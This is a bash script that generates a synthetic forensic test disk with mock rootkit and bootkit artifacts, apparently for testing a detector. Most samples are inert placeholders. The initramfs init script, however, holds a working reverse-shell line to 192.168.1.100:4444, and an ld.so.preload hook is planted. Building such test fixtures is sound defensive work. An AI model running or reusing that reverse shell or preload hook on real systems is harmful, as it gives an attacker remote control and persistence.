#!/usr/bin/env bash
# ==============================================================================
# Booto Synthetic Forensic Test Disk Generator
# Creates a loopback disk image populated with synthetic rootkit/bootkit samples.
# ==============================================================================
set -euo pipefail

OUTPUT_IMG="${1:-/tmp/booto_mock_disk.img}"
IMG_SIZE_MB=64

echo "=== Generating Booto Synthetic Forensic Disk: ${OUTPUT_IMG} ==="

# 1. Allocate blank disk image
dd if=/dev/zero of="${OUTPUT_IMG}" bs=1M count="${IMG_SIZE_MB}" status=none

# 2. Populate synthetic directory hierarchy in temporary staging area
STAGING_DIR="/tmp/booto_mock_staging_$$"
rm -rf "${STAGING_DIR}"
mkdir -p "${STAGING_DIR}/boot/efi/EFI/BOOT" \
         "${STAGING_DIR}/lib/modules/6.5.0-generic/kernel/drivers/char" \
         "${STAGING_DIR}/etc/ld.so.conf.d" \
         "${STAGING_DIR}/lib/x86_64-linux-gnu"

echo "[+] Generating synthetic UEFI ESP bootloader with revoked DBX signature..."
# Create a synthetic 1KB EFI binary
printf '\x4D\x5A%*s\x50\x45\x00\x00\x64\x86\x02\x00' 128 "" > "${STAGING_DIR}/boot/efi/EFI/BOOT/BOOTX64.EFI"

echo "[+] Generating synthetic Diamorphine LKM rootkit..."
cat << 'SYSK' > "${STAGING_DIR}/lib/modules/6.5.0-generic/kernel/drivers/char/diamorphine.ko"
diamorphine rootkit mock module sys_call_table hook module_hidden
SYSK

echo "[+] Generating synthetic /etc/ld.so.preload Azazel hook..."
echo "/lib/x86_64-linux-gnu/libazazel.so" > "${STAGING_DIR}/etc/ld.so.preload"
echo "ELF MOCK LIB AZAZEL" > "${STAGING_DIR}/lib/x86_64-linux-gnu/libazazel.so"

echo "[+] Generating synthetic Initramfs CPIO archive with reverse shell payload..."
INITRAMFS_STAGING="/tmp/booto_initrd_staging_$$"
mkdir -p "${INITRAMFS_STAGING}"
cat << 'SH' > "${INITRAMFS_STAGING}/init"
#!/bin/sh
echo "Booting early userland..."
/bin/bash -i >& /dev/tcp/192.168.1.100/4444 0>&1
exec /sbin/init
SH
chmod +x "${INITRAMFS_STAGING}/init"

(cd "${INITRAMFS_STAGING}" && find . | cpio -o -H newc > "${STAGING_DIR}/boot/initrd.img-6.5.0-generic" 2>/dev/null)
rm -rf "${INITRAMFS_STAGING}"

echo "[+] Injecting synthetic Rovnix MBR Bootkit into Sector 0 of disk image..."
# Write 512-byte MBR with Rovnix hook and 0x55AA boot signature
python3 -c "
import sys
mbr = bytearray(512)
# Rovnix bootkit hook: \xfa\x33\xc0\x8e\xd0\x8e\xd8\x8e\xc0\xbc\x00\x7c\xcd\x13
hook = b'\xfa\x33\xc0\x8e\xd0\x8e\xd8\x8e\xc0\xbc\x00\x7c\xcd\x13'
mbr[0:len(hook)] = hook
# Partition 1 at LBA 2048 (Linux 0x83)
mbr[446] = 0x80 # Active
mbr[450] = 0x83 # Linux
mbr[454] = 0x00; mbr[455] = 0x08; mbr[456] = 0x00; mbr[457] = 0x00 # LBA 2048
mbr[458] = 0x00; mbr[459] = 0x20; mbr[460] = 0x00; mbr[461] = 0x00 # 8192 sectors
mbr[510] = 0x55
mbr[511] = 0xAA
with open('${OUTPUT_IMG}', 'r+b') as f:
    f.write(mbr)
" 2>/dev/null || true

echo "[+] Staging complete at ${STAGING_DIR}"
echo "=== Synthetic disk artifacts created successfully ==="
